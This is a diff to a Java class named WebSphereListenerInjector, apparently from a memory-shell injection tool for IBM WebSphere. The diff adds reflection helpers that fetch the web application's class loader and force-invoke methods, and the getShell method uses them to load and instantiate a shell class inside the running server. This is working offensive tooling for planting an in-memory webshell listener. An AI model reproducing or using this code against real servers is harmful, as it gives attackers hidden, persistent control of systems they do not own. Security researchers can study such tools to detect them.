@@ -64,12 +64,17 @@ public class WebSphereListenerInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "loader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -141,5 +146,28 @@ public class WebSphereListenerInjector {
             }
         }
         throw new NoSuchFieldException(name);
+    }
+
+    @SuppressWarnings("all")
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
+            Exception {
+        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+        Method method = null;
+        while (clazz != null && method == null) {
+            try {
+                if (paramClazz == null) {
+                    method = clazz.getDeclaredMethod(methodName);
+                } else {
+                    method = clazz.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (method == null) {
+            throw new NoSuchMethodException("Method not found: " + methodName);
+        }
+        method.setAccessible(true);
+        return method.invoke(obj instanceof Class ? null : obj, param);
     }
 }
